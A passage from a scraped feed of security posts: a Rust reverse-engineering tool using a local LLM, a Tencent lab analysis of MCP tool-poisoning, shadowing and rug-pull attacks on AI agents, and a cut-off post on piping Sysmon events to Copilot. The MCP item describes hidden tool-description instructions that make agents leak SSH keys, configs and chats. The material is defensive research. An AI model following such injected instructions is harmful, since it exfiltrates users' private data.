effectively.</p>","contentLength":37369,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jzoxr7/theyre_everywhere_why_nonhuman_identities_and/"},{"title":"Aiding reverse engineering with Rust and a local LLM","url":"https://security.humanativaspa.it/aiding-reverse-engineering-with-rust-and-a-local-llm/","date":1744692044,"author":"/u/0xdea","guid":23133,"unread":true,"content":"<blockquote><p><em>“A large fraction of the flaws in software development are due to programmers not fully understanding all the possible states their code may execute in.”\n— John Carmack</em></p></blockquote><p>There’s a new entry in my ever-growing <a href=\"https://security.humanativaspa.it/streamlining-vulnerability-research-with-ida-pro-and-rust/\">tool suite</a>, designed to assist with <strong>vulnerability research against binary targets</strong>: <a href=\"https://github.com/0xdea/oneiromancer\">oneiromancer.</a></p><p>It’s a reverse engineering assistant that uses a <a href=\"https://www.atredis.com/blog/2024/6/3/how-to-train-your-large-language-model\">fine-tuned</a>, <strong>locally running LLM to aid with code analysis</strong>. It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis.</p><p>As you’ve probably guessed, oneiromancer is written in  🦀 While working on this tool, I also <a href=\"https://github.com/rust-lang/crates.io/pull/10905\">contributed</a> the new <a href=\"https://crates.io/categories/security\"> category</a> to crates.io. I hope you’ll find it useful for your projects.</p><p>This article is the fourth installment in our <a href=\"https://security.humanativaspa.it/tag/rust/\">Offensive Rust series</a>. In it, I will introduce my new tool and guide you further along your journey into Rust programming. Let’s dive in!</p><p>The awesome <a href=\"https://security.humanativaspa.it/streamlining-vulnerability-research-with-ida-pro-and-rust/\">idalib Rust bindings</a> were awarded a well-deserved third place! But another project caught my attention among the winners: <a href=\"https://plugins.hex-rays.com/atredispartners/aidapal\">aiDAPal</a> by <a href=\"https://www.atredis.com/\">Atredis Partners</a>. It’s an IDA Pro plugin that uses a  that has been <strong>fine-tuned for Hex-Rays pseudo-code</strong> to assist with code analysis.</p><p>Personally, I’m not buying into the current frenzy around <strong>and large language models</strong> in general. However, I grudgingly have to recognize that <strong>there’s more to LLMs than just hype</strong> (stay tuned to this blog for some innovative developments in this field that we can’t disclose just yet). Anyway, the premise behind aiDAPal intrigued me, and therefore I decided to .</p><p>Since the fine-tuned model is freely <a href=\"https://huggingface.co/AverageBusinessUser/aidapal\">available on Hugging Face</a> under a permissive license, I thought I could write  to query it. And in my never-ending quest to become a better Rust programmer, I decided to write it in Rust. Really fell in love with this language! I never considered myself a  to begin with (although I’ve always enjoyed coding since I started as a kid with <a href=\"https://github.com/angea/pocorgtfo/blob/master/contents/articles/01-07.pdf\">BASIC</a> in the 80s), and I’m definitely no evangelist. I couldn’t care less which language you use 🤷 However,  has got something that makes me really want to <strong>keep digging deeper and building stuff</strong>. But I digress…</p><blockquote><p><em>“Secret agent man, secret agent man\nThey’ve given you a number<p>\nAnd taken away your name”</p>\n— Johnny Rivers, Secret Agent Man (1966)</em></p></blockquote><p>Before we look at some Rust learning resources and deep-dive into oneiromancer’s implementation, let’s uphold our tradition by recommending an appropriate  for your hacking delight!&nbsp;🕵🏻‍♂️</p><p>Here are some  that I recently discovered:</p><p>If you’re still struggling with <strong>starting your first Rust project</strong>, even after perusing the extensive list of learning resources that I’ve shared here and in <a href=\"https://security.humanativaspa.it/tag/rust/\">my past articles</a>, I have a final recommendation for you: <a href=\"https://bitfieldconsulting.com/books/rust-tools\">The Secrets of Rust: Tools</a>. It’s a recent  that will guide you through the process of designing command-line tools in Rust, step by step. If you’re stuck, you might want to give it a try.</p><h3>Querying the Oneiromancer</h3><blockquote><p><em><i>Someone who divines through the interpretation of dreams.</i></em></p></blockquote><p><a href=\"https://github.com/0xdea/oneiromancer\">Oneiromancer</a> is a reverse engineering assistant that uses a  that has been <a href=\"https://www.atredis.com/blog/2024/6/3/how-to-train-your-large-language-model\">fine-tuned</a> for Hex-Rays decompiler’s pseudo-code, to . It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Its main&nbsp; are:</p><ul dir=\"auto\"><li>Cross-platform support for the <a href=\"https://huggingface.co/AverageBusinessUser/aidapal\" rel=\"nofollow\">aidapal</a> based on .</li><li>Easy integration with my <a href=\"https://github.com/0xdea/haruspex\">haruspex</a>&nbsp;and popular IDEs.</li><li>Code , recommended , and variable  are printed to the terminal.</li><li> of each analyzed function is saved in a separate file for easy inspection.</li><li>External crates can invoke  or  to analyze pseudo-code and then process analysis results.</li></ul><p>Additional information on oneiromancer’s features and usage is available at <a href=\"https://crates.io/crates/oneiromancer\">crates.io</a> and in the official <a href=\"https://docs.rs/oneiromancer/latest/oneiromancer/\">documentation</a>.</p><p>Let’s  it and take it for a spin! The easiest way to get the latest release is via <a href=\"https://crates.io/crates/oneiromancer\">crates.io</a>:</p><pre data-enlighter-language=\"raw\" data-enlighter-linenumbers=\"false\" data-enlighter-theme=\"monokai\">$ cargo install oneiromancer\n</pre><p>Before you can use it, however, you must download and install <a href=\"https://ollama.com/\" rel=\"nofollow\">ollama</a>. Then, download the fine-tuned weights and the Ollama modelfile from <a href=\"https://huggingface.co/\" rel=\"nofollow\">Hugging Face</a>:</p><div dir=\"auto\"><pre data-enlighter-language=\"raw\" data-enlighter-theme=\"monokai\" data-enlighter-linenumbers=\"false\">$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal-8k.Q4_K_M.gguf \n$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal.modelfile</pre></div><p>Finally, configure Ollama by running the following commands within the directory in which you downloaded the files:</p><div dir=\"auto\"><pre data-enlighter-language=\"raw\" data-enlighter-theme=\"monokai\" data-enlighter-linenumbers=\"false\">$ ollama create aidapal -f aidapal.modelfile \n$ ollama list</pre><p>Oneiromancer conveniently saves  in a separate file:</p></div><p>The oneiromancer crate can also be  in your own crate. Refer to the <a href=\"https://docs.rs/oneiromancer/latest/oneiromancer/\">documentation</a> to see how.</p><h3>A peek behind the curtain</h3><p>Let’s take a look at the  now. The core of the oneiromancer crate is actually quite simple. The custom LLM developed by <a href=\"https://www.atredis.com/\">Atredis Partners</a> takes care of the bulk of the work and we just need to query it via the .</p><p>The&nbsp; reads the pseudo-code from the target file at the specified path, submits it to the local LLM for analysis, and parses the results. It then outputs to the terminal a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Finally, it saves improved pseudo-code to a separate file:</p><pre data-enlighter-language=\"rust\" data-enlighter-theme=\"monokai\">pub fn run(filepath: &amp;Path) -&gt; anyhow::Result&lt;()&gt; {\n    // Open target source file for reading\n    println!(\"[*] Analyzing source code in {filepath:?}\");\n    let file = File::open(filepath).with_context(|| format!(\"Failed to open {filepath:?}\"))?;\n    let mut reader = BufReader::new(file);\n    let mut source_code = String::new();\n    reader\n        .read_to_string(&amp;mut source_code)\n        .with_context(|| format!(\"Failed to read from {filepath:?}\"))?;\n\n    // Submit source code to local LLM for analysis\n    let mut sp = Spinner::new(\n        Spinners::SimpleDotsScrolling,\n        \"Querying the Oneiromancer\".into(),\n    );\n    let analysis_results =\n        analyze_code(&amp;source_code, None, None).context(\"Failed to analyze source code\")?;\n    sp.stop_with_message(\"[+] Successfully analyzed source code\".into());\n    println!();\n\n    // Create function description in Phrack-style, wrapping to 76 columns\n    let options = textwrap::Options::new(76)\n        .initial_indent(\" * \")\n        .subsequent_indent(\" * \");\n    let function_description = format!(\n        \"/*\\n * {}()\\n *\\n{}\\n */\\n\\n\",\n        analysis_results.function_name(),\n        textwrap::fill(analysis_results.comment(), &amp;options)\n    );\n    print!(\"{function_description}\");\n\n    // Apply variable renaming suggestions\n    println!(\"[-] Variable renaming suggestions:\");\n    for variable in analysis_results.variables() {\n        let original_name = variable.original_name();\n        let new_name = variable.new_name();\n        println!(\"    {original_name}\\t-&gt; {new_name}\");\n\n        let re = Regex::new(&amp;format!(r\"\\b{original_name}\\b\")).context(\"Failed to compile regex\")?;\n        source_code = re.replace_all(&amp;source_code, new_name).into();\n    }\n\n    // Save improved source code to output file\n    let outfilepath = filepath.with_extension(\"out.c\");\n    println!();\n    println!(\"[*] Saving improved source code in {outfilepath:?}\");\n\n    let mut writer = BufWriter::new(\n        File::create_new(&amp;outfilepath)\n            .with_context(|| format!(\"Failed to create {outfilepath:?}\"))?,\n    );\n    writer.write_all(function_description.as_bytes())?;\n    writer.write_all(source_code.as_bytes())?;\n    writer.flush()?;\n\n    println!(\"[+] Done analyzing source code\");\n    Ok(())\n}</pre><p>The following functions, that can also be called by external crates, are in charge of  (either directly or contained in a file) to the local LLM for analysis. If needed, you can specify custom and  values via the environment.</p><pre data-enlighter-language=\"rust\" data-enlighter-theme=\"monokai\">pub fn analyze_code(\n    source_code: &amp;str,\n    baseurl: Option&lt;&amp;str&gt;,\n    model: Option&lt;&amp;str&gt;,\n) -&gt; Result&lt;OneiromancerResults, OneiromancerError&gt; {\n    // Check environment variables\n    let env_baseurl = env::var(\"OLLAMA_BASEURL\");\n    let env_model = env::var(\"OLLAMA_MODEL\");\n\n    // Send Ollama API request and parse response\n    let request = OllamaRequest::new(\n        model.unwrap_or_else(|| env_model.as_deref().unwrap_or(OLLAMA_MODEL)),\n        source_code,\n    );\n    request\n        .send(baseurl.unwrap_or_else(|| env_baseurl.as_deref().unwrap_or(OLLAMA_BASEURL)))?\n        .parse()\n}\n\npub fn analyze_file(\n    filepath: impl AsRef&lt;Path&gt;,\n    baseurl: Option&lt;&amp;str&gt;,\n    model: Option&lt;&amp;str&gt;,\n) -&gt; Result&lt;OneiromancerResults, OneiromancerError&gt; {\n    // Open target source file for reading\n    let file = File::open(&amp;filepath)?;\n    let mut reader = BufReader::new(file);\n    let mut source_code = String::new();\n    reader.read_to_string(&amp;mut source_code)?;\n\n    // Analyze `source_code`\n    analyze_code(&amp;source_code, baseurl, model)\n}</pre><p>The&nbsp;<strong> and&nbsp; functions</strong>&nbsp;use the , , , and  abstractions defined in separate files.</p><p>For further details, refer to <strong>oneiromancer’s source code on GitHub</strong>:</p><p>Once again, the heavy lifting of fine-tuning the local LLM to analyze pseudo-code generated by the Hex-Rays decompiler was done by <a href=\"https://github.com/AverageBusinessUser\">Chris Bellows</a> and <a href=\"https://www.atredis.com/\">Atredis Partners</a>. They deserve all credit for training the <a href=\"https://huggingface.co/AverageBusinessUser/aidapal\" rel=\"nofollow\">aidapal</a> custom LLM that’s queried by oneiromancer.</p>","contentLength":9295,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jzjcm9/aiding_reverse_engineering_with_rust_and_a_local/"},{"title":"Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol Insights","url":"https://medium.com/@foraisec/security-analysis-potential-ai-agent-hijacking-via-mcp-and-a2a-protocol-insights-cd1ec5e6045f","date":1744626649,"author":"/u/CoatPowerful1541","guid":22840,"unread":true,"content":"<p><strong>Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol Insights</strong></p><p>Communication protocols represent a core infrastructure accelerating the development and deployment of AI Agents. Anthropic’s Model Context Protocol (MCP) has emerged as a prominent protocol for connecting AI Agents to external tools, while Google’s recently released Agent2Agent (A2A) protocol focuses on facilitating collaboration between intelligent agents and enabling the creation of multi-agent systems. As key communication specifications in the AI Agent era, their security posture is critical to establishing secure boundaries for AI Agents. Any vulnerability could lead to cascading risks, including AI Agent hijacking and data leakage. Tencent’s Zhuque Lab has systematically reviewed potential security flaws in the MCP protocol, common attack vectors, and mitigation strategies. Additionally, this analysis covers the security features of Google’s A2A protocol, offering insights for the industry to build more secure AI Agent products.</p><p><strong>I. Example Scenario: Malicious MCP Hijacking Cursor to Exfiltrate WhatsApp Data</strong></p><p>As described in an April 6, 2025 blog post by security company Invariant Labs, risks such as the “Tool Poisoning Attack” (TPA) associated with MCP were disclosed, primarily affecting users of MCP clients like Cursor and Claude for Desktop. The core mechanism of the TPA involves embedding malicious instructions within tool descriptions, often hidden in MCP code comments. These instructions, though not directly visible to the user in simplified UI views, are processed by the AI model. Such hidden instructions can manipulate the AI Agent into performing unauthorized actions, such as reading sensitive files or exfiltrating private data.</p><p>For instance, consider a scenario where a user’s Cursor instance has a malicious MCP installed. If the user employs the legitimate  tool (e.g., <a href=\"https://github.com/lharries/whatsapp-mcp\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://github.com/lharries/whatsapp-mcp</a>) to view messages and send a \"Hi\" message, the attack could potentially cause the user's recent WhatsApp chat history to be sent to an attacker-controlled number.</p><p>This hypothetical attack exhibits the following characteristics:</p><ol><li>It leverages the existing permissions granted to the user-installed  tool to exfiltrate data, without necessarily exploiting vulnerabilities within WhatsApp itself.</li><li>It only requires the installation of the malicious MCP; the AI Agent does not need to interact  with the malicious tool’s overt functionality.</li><li>Due to potential UI limitations (e.g., Cursor not automatically wrapping extremely long content), users might not easily notice the leaked chat history within the tool parameters.</li></ol><p>The underlying principle of this attack is relatively straightforward. The malicious MCP code might resemble the following:</p><pre></pre><ol><li>Upon installation (and potentially subsequent runs triggering the marker file check), the malicious MCP injects backdoor instructions within the  tags into the  tool's description, loading them into the Cursor conversation context.</li><li>Cursor is now effectively “poisoned.” When the user utilizes the  tool, the AI, influenced by the injected instructions from the malicious MCP's context, constructs the  parameters. It concatenates the retrieved WhatsApp conversation list with the original message, possibly using padding or formatting tricks (like the  string) to obscure the data within the  parameter in the JSON payload presented for user confirmation. Users might need to scroll horizontally to see the full content.</li><li>If the user overlooks the manipulated recipient number and the appended chat history in the confirmation dialog and approves the tool execution, their private chat history is sent to the attacker’s number, resulting in data leakage.</li></ol><p><strong>II. MCP &amp; A2A Security Fundamentals</strong></p><p><strong>2.1 Introduction to MCP and A2A</strong> The Model Context Protocol (MCP), proposed by Anthropic, is an open standard designed to establish secure, bidirectional connections between AI models and external tools (APIs, databases, file systems, etc.). Prior to standardized protocols like MCP, integrating tools often required bespoke development for each tool, leading to inefficiency. MCP provides a pluggable framework aiming to streamline the process of extending AI capabilities.</p><p>On April 9, 2025 (as per Google’s announcement timeline), Google Cloud introduced the Agent2Agent (A2A) protocol, presented as the first open standard specifically designed for AI agent interoperability. Google positions A2A as complementary to MCP, addressing agent-to-agent communication, whereas MCP focuses on agent-to-tool communication.</p><p><strong>2.2 Identified MCP Security Weaknesses</strong> The initial design of MCP (e.g., the version released around November 2024) and common implementations may exhibit security weaknesses, potentially stemming from a primary focus on enabling local tool usage or trusted vendor interactions without fully anticipating adversarial scenarios:</p><ol><li> AI models process the  tool description, including content hidden within comments or specific tags. However, user-facing interfaces in AI Agents often display only simplified functional summaries, potentially omitting malicious instructions embedded within the full description.</li><li><strong>Lack of Context Isolation:</strong> When an AI Agent connects to multiple MCP servers, the description information for all tools can be loaded into the same session context. This allows descriptions from a malicious MCP server to potentially influence the behavior of tools provided by trusted MCP services (see Shadowing Attack below).</li><li><strong>Insufficient Large Language Model (LLM) Security:</strong> LLMs are designed to follow instructions meticulously, including those in MCP tool descriptions. They often lack robust capabilities to discern malicious intent, especially when instructions are disguised as operational necessities. Furthermore, developer-added security prompts can often be bypassed using sophisticated jailbreaking techniques.</li><li><strong>Lack of Version Control and Update Mechanisms:</strong> The MCP protocol specification historically lacked strict version control and secure update mechanisms for remote MCPs. This enables “Rug Pull” scenarios where a malicious actor can modify a remote tool’s description  initial user installation and approval, without the client automatically detecting the change or requiring re-authorization.</li><li><strong>Insufficient Security Isolation and Vetting:</strong> Official MCP documentation traditionally did not strongly mandate running MCP services in sandboxed environments (like Docker). Third-party MCP marketplaces may lack rigorous security vetting processes, making it easier for users to install MCP services containing backdoors or vulnerabilities.</li><li><strong>Incomplete Authorization and Authentication Guidance:</strong> For interfaces performing sensitive operations (e.g., database queries, file access, command execution), early MCP specifications did not mandate specific authorization (AuthZ) and authentication (AuthN) mechanisms. This oversight could lead to publicly exposed MCP services being compromised or misused.</li></ol><p><strong>2.3 Google A2A Protocol Security Features Analysis</strong></p><p>In contrast to MCP’s common use case involving local or community-provided tools (where source code might be available), Google A2A targets secure communication between potentially “black box” agents from different providers. Google asserts a “secure-by-default” design philosophy for A2A, incorporating several standard security mechanisms:</p><ul><li><strong>Enterprise-Grade Authentication and Authorization:</strong> Explicit support for protocols like OAuth 2.0 ensures that only authorized agents can interact.</li><li> Leverages OpenAPI specifications for describing agent capabilities, commonly using Bearer Tokens in headers for authentication.</li><li> Designed to ensure agents perform only authorized actions, enabling fine-grained management of agent capabilities.</li><li> Supports encrypted data exchange (e.g., via HTTPS) to protect sensitive information during transmission.</li><li><strong>Evolving Authorization Schemes:</strong> Plans include enhancing the  (see below) with additional authorization mechanisms, such as embedded optional credentials.</li></ul><p>A key component is the , a standardized metadata file () describing an agent's capabilities, skills, endpoint URL, and authentication requirements. This allows agents to discover and understand each other's functionalities and access prerequisites dynamically and securely.</p><pre></pre><p>As indicated, A2A supports various authentication schemes, from simple API keys to enterprise solutions like OAuth. Similar robust mechanisms are expected for securing message transport. Compared to the baseline MCP specification, Google’s A2A protocol appears significantly more mature regarding built-in security features and explicit guidance.</p><p>From an attacker’s perspective, A2A’s focus on inter-agent communication implies many A2A endpoints will be publicly accessible. Vulnerabilities in A2A implementations could therefore have a broad impact and potentially lower exploitation cost compared to locally deployed MCPs. This requires heightened security awareness from developers implementing A2A agents. Continued monitoring of A2A security developments and implementation practices is warranted.</p><p><strong>III. Common Attack Methods Against MCP Implementations</strong></p><p><strong>3.1 Tool Poisoning Attack (TPA)</strong></p><p>TPAs exploit hidden instructions within tool descriptions to manipulate the LLM’s behavior. Consider this example:</p><pre></pre><p>In this example, the Python code implements a simple addition function. However, malicious instructions are embedded within the  tag in the docstring comments. These instructions direct the AI model to:</p><ol><li>Read sensitive configuration files ().</li><li>Access the user’s private SSH key ().</li><li>Exfiltrate this data covertly via the  parameter.</li><li>Obfuscate these actions by generating unrelated explanatory text (e.g., mathematical reasoning).</li></ol><p>When a user attempts to use this tool for a simple addition, the AI simultaneously processes the hidden malicious instructions. The client UI might only display the benign description (“Adds two numbers”) and the parameters  and . The  parameter, containing the exfiltrated data, might be presented but could be extremely long or require horizontal scrolling, making it easy for users to overlook if they don't meticulously inspect all parameters before confirming execution.</p><p>If the user approves the execution without noticing the malicious payload in , the data is sent to the MCP server controlled by the attacker.</p><p>After the tool executes, the frontend might display only the requested mathematical explanation. By this time, the attacker’s MCP server has received the sensitive data (e.g., SSH key). Even if the user later notices suspicious activity, the data exfiltration has already occurred.</p><p>The TPA described above relies on the malicious instructions being present when the user interacts with the tool. However, what if the user inspects the MCP service code  and finds it clean? This introduces the “Rug Pull” attack, analogous to scams in the cryptocurrency space. In a crypto Rug Pull, developers launch a project, attract investment, and then exploit a hidden backdoor or abandon the project, stealing funds.</p><p>In the MCP context, a Rug Pull attack proceeds as follows:</p><ol><li>A user installs and enables an initially legitimate-seeming MCP service, perhaps discovered via social recommendations or a marketplace. The service might be hosted remotely by the developer.</li><li>At a later time, the attacker modifies the code , injecting malicious instructions (like those used in TPA) into the tool descriptions.</li><li>When the user subsequently uses the tool, the AI processes the now-malicious description, falling victim to the poisoning attack, even though the initially installed version appeared safe.</li></ol><p>Similar supply chain risks exist for software packages (e.g., on PyPI), but users are typically safe if they don’t update packages without verification. MCP’s support for remote services, combined with a lack of mandatory client-side integrity checks or re-confirmation prompts upon remote code changes, exacerbates the Rug Pull risk. Users often cannot easily determine if the code running on a remote MCP server has been altered since they first enabled it.</p><p>When multiple MCP servers are connected to a single AI agent client, a malicious server can execute a “Shadowing” attack. This involves manipulating the AI’s behavior <em>when interacting with other, trusted MCP services</em>. Essentially, the malicious MCP’s instructions cast a “shadow” over the operations of legitimate tools.</p><p>Consider a malicious MCP providing a simple  tool, but its description contains instructions targeting a separate, trusted  tool:</p><pre></pre><p>When the user later attempts to use the legitimate  tool, the AI, having processed the malicious MCP's description loaded into its context, follows the hidden instructions. It redirects the email to the attacker's address () instead of the user-specified recipient. The danger here is significant because the attack takes effect <em>even if the user never directly invokes the malicious </em>. Merely having the malicious MCP enabled and its tool descriptions loaded into the agent's context is sufficient to compromise the behavior of other trusted tools.</p><p><strong>3.4 Command Injection Attack</strong></p><p>Beyond attacks targeting the AI client via malicious descriptions, the security of the MCP  itself is crucial. Historically, AI agents using Function Calling sometimes suffered from command injection vulnerabilities if tool parameters were improperly sanitized before being used in system commands or other sensitive operations. This risk persists with MCP, potentially with lower barriers to exploitation if MCP services are exposed insecurely.</p><p>Firstly, many MCP services are explicitly designed for potentially dangerous operations like system command execution, file read/write, or database interaction. If these services are deployed without adequate sandboxing (e.g., Docker containers with restricted permissions) and network controls (e.g., firewall rules, authentication for public exposure), they become prime targets for exploitation.</p><p>Secondly, real-world examples exist where MCP services handling sensitive operations, like financial transactions, lacked sufficient authorization checks. For instance, security researchers (like the SlowMist team example referenced) demonstrated scenarios where internal functions of a cryptocurrency exchange’s MCP could potentially be triggered via conversational interaction to perform unauthorized actions like fund transfers.</p><p>For providers offering MCP marketplaces or hosting platforms, it is highly recommended to utilize secure execution environments like serverless functions (e.g., AWS Lambda, Google Cloud Functions) or tightly sandboxed containers for hosting third-party MCP code. Failure to do so could allow vulnerabilities in developer-uploaded MCP code to compromise the hosting provider’s infrastructure or other tenants. (Alibaba Cloud’s Bailian platform using a serverless approach is cited as an example of better practice).</p><p>Beyond the specific attacks above, MCP ecosystems are susceptible to broader security risks:</p><p>(1)  Attackers might upload MCP services with backdoors or vulnerabilities to public marketplaces. They could also use typosquatting (names mimicking popular services) to trick users. Installing such malicious MCPs can lead to data leakage or agent compromise.</p><p>(2) <strong>Prompt Injection and Jailbreaking (Targeting MCP Services):</strong> Some MCP services might internally use LLMs to process requests or generate responses. Attackers could use prompt injection techniques in their requests to these MCP services to extract internal prompts, manipulate the service’s behavior, or cause it to generate harmful/sensitive output.</p><p>(3) <strong>API Key / Credential Theft:</strong> Many MCP services (e.g., for cloud services, databases) require users to provide API keys or other credentials. Attackers could create malicious MCPs that convincingly mimic legitimate services, providing the expected functionality while secretly stealing the credentials entered by the user. Compromised legitimate MCP services could also be backdoored to steal keys.</p><p><strong>IV. Recommendations for MCP Security Enhancement</strong></p><p>For end-users of MCP clients (Cursor, Claude for Desktop, etc.), exercise caution when installing third-party MCP services. Prefer well-known, open-source, and actively maintained options. Whenever feasible, deploy MCP services within isolated environments like Docker containers, restricting their file system and network access. Critically examine the complete input parameters displayed in the UI confirmation dialog before executing any MCP tool call, watching for suspicious or unexpected data.</p><p>For MCP protocol maintainers, AI Agent developers, and the broader ecosystem, consider the following security enhancements (incorporating suggestions from community members like  and Zhuque Lab's findings):</p><p><strong>4.1 MCP Protocol Specification Improvements (For Protocol Maintainers)</strong></p><ol><li><strong>Standardize Instruction Syntax:</strong> Clearly differentiate between descriptive text (for LLM understanding) and executable instructions within tool descriptions using mandatory, distinct syntax. Clients should be required to recognize and potentially handle these instruction types differently (e.g., requiring specific user approval for execution instructions).</li><li> Introduce a more granular permission model. For example, tool descriptions should not be able to instruct the AI to read arbitrary local files unless explicitly granted that permission by the user for that specific tool. Instructions attempting to modify the behavior of  tools should be prohibited by default or require explicit declaration and user consent.</li><li><strong>Source Verification and Signing:</strong> Mandate or strongly recommend digital signatures for tool descriptions provided by MCP servers. Clients should verify the signature against a trusted source registry to ensure description integrity and authenticity, mitigating tampering and certain Rug Pull scenarios.</li></ol><p><strong>4.2 AI Agent Development Security Practices (For Agent Developers)</strong></p><ol><li><strong>Implement Security Sandboxing:</strong> Isolate tool descriptions and execution environments originating from different MCP servers. This limits the ability of one MCP service (A) to directly interfere with another (B). For MCPs requiring sensitive permissions (command execution, file system access), deployment within secure sandboxes (Docker, VMs, WebAssembly runtimes) should be standard practice, potentially enforced by the agent platform.</li><li><strong>Input/Output Filtering and Monitoring:</strong> Implement robust filtering and monitoring for both LLM prompts/responses and MCP tool inputs/outputs. This includes scanning for prompt injection attempts, patterns indicative of sensitive data (file paths, keys), and instructions aimed at unauthorized cross-tool manipulation. Ensure the agent validates data returned from MCP tools to prevent exfiltration via encoded/hidden payloads.</li><li><strong>Enhance UI Transparency and User Confirmation:</strong> The agent’s UI  provide access to the complete tool description, not just a summary. Before executing potentially sensitive operations or actions triggered by complex instructions, clearly present the AI’s full intended action, the justification (including the originating instruction if ambiguous), and require explicit, fine-grained user confirmation. Avoid UI designs that obscure long parameters.</li><li><strong>Version Pinning and Integrity Checks:</strong> Implement mechanisms to pin installed MCP tool versions and verify their descriptions (e.g., via cryptographic hashes) against the user-approved version upon loading. Notify users and require re-confirmation if the description of a remote MCP service changes unexpectedly.</li></ol><p><strong>4.3 MCP Ecosystem Security Measures (For Marketplaces, Security Vendors)</strong></p><ol><li> MCP marketplace providers should establish mandatory security auditing processes for submitted MCP services. Security vendors can contribute by developing tools (like the “Mcp-Scan”) to automatically scan MCP code for known vulnerabilities, backdoors, malicious instruction patterns, and other risks.</li><li><strong>Security Incident Monitoring and Disclosure:</strong> Encourage responsible disclosure of discovered MCP vulnerabilities and attack campaigns. Security vendors should actively monitor the ecosystem for threats. Initiatives like Zhuque Lab’s AI-Infra-Guard, which tracks AI infrastructure vulnerabilities, should be expanded to include MCP-specific threat intelligence and detection signatures.</li></ol><p><strong>V. Future Security Challenges and Outlook</strong></p><p>The MCP specification document updated around March 25, 2025, formally introduced support for OAuth 2.1 authorization, aiming to secure interactions between MCP clients and servers with managed permissions. It also outlined key principles for Security and Trust &amp; Safety:</p><ul><li><strong>User Consent and Control:</strong> Emphasizing explicit user consent, understanding of operations, user control over data, and clear UI for authorization.</li><li> Requiring explicit consent for data exposure, preventing unauthorized data transfer, and protecting data via access controls.</li><li> Treating tools (especially those involving code execution) cautiously, considering descriptions untrusted unless verified, requiring explicit consent for tool calls, and ensuring user understanding.</li><li> Requiring explicit user approval for LLM sampling requests initiated by servers, user control over prompt content, and limiting server visibility into prompts.</li></ul><p>Crucially, the MCP maintainers state that the protocol  does not enforce these principles; the responsibility for secure implementation lies with AI Agent and MCP service developers. General advice is provided (implement consent flows, provide clear documentation, use access controls, follow best practices), but unlike Google’s A2A approach, MCP does not appear to mandate specific security mechanisms like OAuth or provide detailed, built-in capabilities for fine-grained permission control or security hardening directly within the protocol standard.</p><p>Consequently, many of the risks discussed in this article remain relevant, contingent on developer diligence and implementation choices. The proliferation of third-party MCP marketplaces, the lag in existing developers adopting newer security practices, and relatively limited industry focus on MCP-specific security contribute to ongoing challenges. The security posture of the newer Google A2A protocol also requires continued observation and research as its adoption grows.</p><p>Tencent’s Zhuque Lab remains committed to researching AI security, including LLM security, AI Agent security, and AIGC content detection. We encourage collaboration and knowledge sharing within the community to address these evolving challenges.</p><p>This article is translated from Chinese. The original post can be found here: <a href=\"https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fx3N7uPV1sTRyGWPH0jnz7w\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://mp.weixin.qq.com/s/x3N7uPV1sTRyGWPH0jnz7w</a>. The original title is “AI Agent破局：MCP与A2A定义安全新边界”, and the author is Nicky of Tencent Zhuque Lab.</p>","contentLength":22832,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jyvlzh/security_analysis_potential_ai_agent_hijacking/"},{"title":"EDV - Endpoint Detection & Vibes - From vibe coding to vibe detections","url":"https://tierzerosecurity.co.nz/2025/04/14/edv.html","date":1744601567,"author":"/u/clod81","guid":22762,"unread":true,"content":"<p>\n          14 April 2025\n          Claudio Contin\n        </p><p>\n          Andrej Karpathy (OpenAI co-founder) came up with the term , which is the concept of writing software using AI by purely using prompts, without the need of coding skills.\n        </p><p>\n          Given the vibes of our current times, few days ago I was thinking: what's the \"vibest\" thing I could try to build in a few hours?\n        </p><p>\n          Then I remembered that Windows ships with the Copilot Chat application, which allows users to interact with the Copilot LLM without needing a paid Copilot API plan.\n        </p><p>\n          So I thought, would it be possible to use this LLM to deliver Windows host events to the LLM and let it determine if the events are a result of malicious actions performed?\n        </p><p>\n          I decided to investigate how the Windows Copilot application works... Buckle up and get ready to vibe!\n        </p><p>\n          The built-in Windows Copilot application is nothing more than a Progressive Web Application (PWA) that can be installed on a device and accessed as a standalone application. The application loads and renders the <a href=\"https://copilot.microsoft.com\" target=\"_blank\">Copilot web application</a>.\n        </p><p>\n          When a new chat is started, the application makes an HTTP POST request to the  endpoint.\n        </p><p>\n          Once the conversation ID is returned, the application then switches protocol to use WebSocket, and the chat communication is performed over this channel.\n        </p><p>\n          Sysmon events are visible from the Event Viewer, and can be programmatically queried using the <code>Microsoft-Windows-Sysmon/Operational</code> log channel. Note that local administrator privileges are required in order to view and query Sysmon events (high integrity level). \n        </p><p>\n          I decided to query these Sysmon generated events (the raw XML which contains the full event details), send them to Copilot for analysis, and let Copilot decide if any of them contain any potentially malicious actions.\n        </p><p>\n          I wrote the <a href=\"https://github.com/TierZeroSecurity/EDV\" target=\"_blank\">EDV tool</a> that queries Sysmon events, and delivers them to Copilot for analysis, using the WebSocket channel, in the same way as the Copilot Chat application. If you are wondering if AI was used to help coding it: ooohhh yessss, this is all about vibes!\n        </p><p>\n          The tool can be run in two different modes:\n          </p><p>\n          I originally only implemented the  method, which obtains a new conversation ID from the Copilot endpoint mentioned earlier, and establishes a WebSocket connection that is used to send events and receive responses synchronously and in chronological order (earlier events first). If multiple prompts are sent concurrently over the same WebSocket channel, the Copilot endpoint returns an error, related to rate limiting ().\n        </p><p>\n          While writing, or better vibing, the tool, I then attempted to establish a new WebSocket connection for each of the event, and send a few of them in parallel, using the same conversation ID for all. In this scenario, the Copilot endpoint did not prevent concurrent requests. For this reason, the tool can also be launched with the  mode. Note that in this mode, the events are not sent in a synchronous and chronological order, which might reduce the detection capability, 